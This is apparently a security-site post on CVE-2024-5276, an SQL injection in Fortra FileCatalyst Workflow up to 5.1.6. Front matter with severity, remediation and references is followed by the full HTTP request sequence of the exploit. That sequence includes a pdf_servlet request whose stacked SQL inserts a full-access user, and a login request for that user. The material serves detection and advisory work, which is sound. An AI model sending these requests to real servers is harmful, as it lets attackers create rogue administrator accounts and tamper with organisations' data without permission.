---
layout: post
cve_id: CVE-2024-5276
title: Fortra FileCatalyst Workflow <= v5.1.6 - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-5276.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-5276.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Attackers can execute SQL injection to create administrative users, delete
  or modify application database content. Unauthenticated exploitation is possible
  if anonymous access is enabled.

  '
remediation: 'Update Fortra FileCatalyst Workflow to version 5.1.7 Build 136 or later
  to address the SQL injection vulnerability.

  '
reference:
- https://www.tenable.com/security/research/tra-2024-25
- https://support.fortra.com/filecatalyst/kb-articles/advisory-6-24-2024-filecatalyst-workflow-sql-injection-vulnerability-YmYwYWY4OTYtNTUzMi1lZjExLTg0MGEtNjA0NWJkMDg3MDA0
- https://www.fortra.com/security/advisory/fi-2024-008
- https://nvd.nist.gov/vuln/detail/CVE-2024-5276
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-5276
  cwe-id: CWE-20
  epss-score: 0.85363
  epss-percentile: 0.99331
metadata:
  max-request: 6
  verified: true
  fofa-query: body="FileCatalyst file transfer solution, easily transfer large files"
tags:
- cve
- cve2024
- sqli
- auth-bypass
- fortra
- filecatalyst
- instrusive
- sqli
- vkev
- vuln
---

## ðŸ” Vulnerability Description
A SQL Injection vulnerability in Fortra FileCatalyst Workflow allows an attacker to modify application data.Â  Likely impacts include creation of administrative users and deletion or modification of data in the application database. Data exfiltration via SQL injection is not possible using this vulnerability. Successful unauthenticated exploitation requires a Workflow system with anonymous access enabled, otherwise an authenticated user is required.Â This issue affects all versions of FileCatalyst Workflow from 5.1.6 Build 135 and earlier.


## ðŸŒ HTTP Request
```nohighlight
GET /workflow/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /workflow/jsp/logon.jsp;jsessionid=2pnp0y HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /0mmAV1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-ca) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /workflow/servlet/pdf_servlet?JOBID=1'%3BINSERT%20INTO%20DOCTERA_USERS%20(USERNAME%2C%20PASSWORD%2C%20ENCPASSWORD%2C%20FIRSTNAME%2C%20LASTNAME%2C%20COMPANY%2C%20ADDRESS%2C%20ADDRESS2%2C%20CITY%2C%20STATE%2C%20ALTPHONE%2C%20ZIP%2C%20COUNTRY%2C%20PHONE%2C%20FAX%2C%20EMAIL%2C%20LASTLOGIN%2C%20CREATION%2C%20PREFERREDSERVER%2C%20CREDITCARDTYPE%2C%20CREDITCARDNUMBER%2C%20CREDITCARDEXPIRY%2C%20ACCOUNTSTATUS%2C%20USERTYPE%2C%20COMMENT%2C%20ADMIN%2C%20SUPERADMIN%2C%20ACCEPTEMAIL%2C%20ALLOWHOTFOLDER%2C%20PROTOCOL%2C%20BANDWIDTH%2C%20DIRECTORY%2C%20SLOWSTARTRATE%2C%20USESLOWSTART%2C%20SLOWSTARTAGGRESSIONRATE%2C%20BLOCKSIZE%2C%20UNITSIZE%2C%20NUMENCODERS%2C%20NUMFTPSTREAMS%2C%20ALLOWUSERBANDWIDTHTUNING%2C%20EXPIRYDATE%2C%20ALLOWTEMPACCOUNTCREATION%2C%20OWNERUSERNAME%2C%20USERLEVEL%2C%20UPLOADMETHOD%2C%20PW_CHANGEABLE%2C%20PW_CREATIONDATE%2C%20PW_DAYSBEFOREEXPIRE%2C%20PW_MUSTCHANGE%2C%20PW_USEDPASSWORDS%2C%20PW_NUMERRORS)%20VALUES('dqvaaw'%2C%20NULL%2C%20'5C27C34C270CAFFE0C3D4FBA1A0DD36D'%2C%20'dqvaawFirstName'%2C%20'dqvaawLastName'%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20'202-404-2400'%2C%20''%2C%20'dqvaaw%40mydomain.local'%2C%201714014839723%2C%201714013661166%2C%20'default'%2C%20''%2C%20''%2C%20''%2C%20'full%20access'%2C%20''%2C%20''%2C%201%2C%200%2C%200%2C%200%2C%20'DEFAULT'%2C%20'0'%2C%200%2C%20'0'%2C%201%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%200%2C%200%2C%200%2C%20''%2C%200%2C%20'DEFAULT'%2C%200%2C%201714014752270%2C%20-1%2C%200%2C%20NULL%2C%200)%3B--%20- HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /workflow/jsp/logon.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /workflow/logon.do HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/58.0.1
Connection: close
Content-Length: 71
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=fvmuXy
Accept-Encoding: gzip

FCWEB.FORM.TOKEN=gTG3vS&username=dqvaaw&password=6nTQZHHd&submit=Login&
```

